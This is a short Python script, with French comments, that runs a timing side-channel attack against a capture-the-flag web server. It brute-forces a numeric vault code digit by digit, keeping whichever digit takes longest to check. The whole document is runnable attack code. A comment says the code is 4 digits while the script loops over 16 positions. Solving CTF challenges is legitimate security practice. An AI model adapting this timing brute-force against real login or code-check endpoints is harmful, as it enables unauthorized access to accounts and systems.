import time
import requests

charset = '0123456789'
length = 16  # Le code du coffre-fort est de 4 chiffres selon le HTML
current_code = ''

def brute_force(charset, length):
    global current_code
    
    for i in range(length):
        timings = {}  # Réinitialiser les timings à chaque position
        
        for char in charset:
            test_code = current_code + char
            total_time = 0
            
            # Faire plusieurs essais pour réduire le bruit
            num_tests = 1
            for _ in range(num_tests):
                start = time.perf_counter()
                url = 'http://ctf.bdepalme.fr:5000/code?c=' + test_code
                response = requests.get(url)
                end = time.perf_counter()
                total_time += (end - start)
            
            # Stocker le temps moyen
            timings[char] = total_time / num_tests
        
        # Trouver le caractère qui a pris le plus de temps (indiquant une vérification plus profonde)
        next_char = max(timings, key=timings.get)
        current_code += next_char
        print(f"Position {i+1}: {timings}")
        print(f"Code actuel: {current_code}")

start_time = time.time()
print("Démarrage de l'attaque par timing")
brute_force(charset, length)
end_time = time.time()
total_duration = end_time - start_time
print(f"Code trouvé: {current_code}")
print(f"Temps total d'exécution: {total_duration:.2f} secondes")

